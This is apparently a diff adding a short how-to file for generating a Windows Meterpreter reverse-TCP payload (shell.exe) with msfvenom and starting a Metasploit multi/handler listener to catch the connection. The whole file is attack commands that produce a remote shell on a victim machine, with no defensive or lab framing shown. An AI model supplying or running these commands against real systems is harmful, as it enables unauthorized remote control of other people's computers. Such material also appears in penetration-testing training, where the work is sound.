@@ -1,0 +1,14 @@
+Generating a Payload For windows
+
+$sudo service postgresql start
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=(IP Address Of Machine) lport=(Port No) -f exe -a x86 -o shell.exe
+
+
+## Creating a Listner ##
+02 $ msfconsole
+03.> use multi/handler
+04.:> set payload windows/meterpreter/reverse_tcp
+
+05.:> set lhost=(Ip Address Of Machine)
+06.:> set lport=(Port No.)
+07.:> exploit
